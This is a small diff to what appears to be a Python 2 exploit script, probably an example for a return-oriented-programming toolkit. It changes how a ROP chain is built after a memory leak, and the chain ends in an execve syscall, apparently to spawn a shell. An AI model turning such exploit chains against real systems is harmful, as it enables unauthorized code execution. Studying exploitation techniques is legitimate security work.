@@ -27,10 +27,10 @@ buf += rop.fill(400, buf)
 p.write(buf)
 data = p.read(0x200000)
 print "[+] len(data) = %x" % len(data)
-ropblob = rop.derive(data, base=ref_addr)
+rop.load(data, base=ref_addr)
 addr_stage -= 200
 
-buf = ropblob.syscall(nr_execve, addr_stage+100+16, addr_stage+100, 0)
+buf = rop.syscall(nr_execve, addr_stage+100+16, addr_stage+100, 0)
 buf += rop.fill(100, buf)
 buf += p64(addr_stage+100+16)
 buf += p64(0)
